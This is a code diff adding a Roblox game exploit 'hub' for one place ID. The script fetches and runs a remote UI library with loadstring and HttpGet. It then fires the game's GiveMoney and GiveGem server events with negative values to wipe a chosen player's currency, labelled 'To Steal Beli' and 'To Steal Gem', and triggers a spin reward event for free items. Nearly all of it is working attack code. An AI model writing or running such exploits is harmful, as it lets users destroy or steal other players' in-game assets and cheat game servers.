@@ -104,4 +104,90 @@ while wait() do
 end
 end)
 end
+elseif PlaceID == 12004594806 then
+    local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("GodY Hub", "DarkTheme")
+
+local Credit = Window:NewTab("Credit")
+local CreditSection = Credit:NewSection("Credit By GodYT_2.0#5102")
+
+local Main = Window:NewTab("Main")
+local MainFunction = Main:NewSection("Main Function")
+
+MainFunction:NewTextBox("Select Players : Beli", "To Steal Beli", function(Name)
+    
+local Target = tostring(Name)
+local A = 0
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    if string.find(v.Name , Target) then
+        if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Beli.Value)
+        A = A + 1
+        end
+elseif string.find(string.lower(v.Name) , string.lower(Target)) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Beli.Value)
+        A = A + 1
+    end
+elseif string.find(v.DisplayName , Target) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Beli.Value)
+        A = A + 1
+    end
+elseif string.find(string.lower(v.DisplayName) , string.lower(Target)) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveMoney"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Beli.Value)
+        A = A + 1
+    end
+end
+end
+end)
+
+MainFunction:NewTextBox("Select Players : Gem", "To Steal Gem", function(Name)
+    
+local Target = tostring(Name)
+local A = 0
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+    if string.find(v.Name , Target) then
+        if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveGem"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Gem.Value)
+        A = A + 1
+        end
+elseif string.find(string.lower(v.Name) , string.lower(Target)) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveGem"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Gem.Value)
+        A = A + 1
+    end
+elseif string.find(v.DisplayName , Target) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveGem"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Gem.Value)
+        A = A + 1
+    end
+elseif string.find(string.lower(v.DisplayName) , string.lower(Target)) then
+    if A == 0 then
+        game:GetService("ReplicatedStorage"):WaitForChild("GiveGem"):FireServer(game:GetService("Players")[v.Name] , -game:GetService("Players")[v.Name].Data.Gem.Value)
+        A = A + 1
+    end
+end
+end
+end)
+
+MainFunction:NewButton("Free Random DF", "Random DF For Free", function()
+    local RarityTable = {
+        [1] = "Common",
+        [2] = "Uncommon",
+        [3] = "Epic",
+        [4] = "Legendary"
+    }
+    local Rarity = math.random(1,4)
+    for i,v in pairs(RarityTable) do
+        if i == Rarity then
+    local args = {
+    [1] = v
+}
+
+game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("SpinGui"):WaitForChild("LOL"):WaitForChild("Spin"):WaitForChild("Spin"):WaitForChild("Reward"):FireServer(unpack(args))
+        end
+    end
+end)
 end
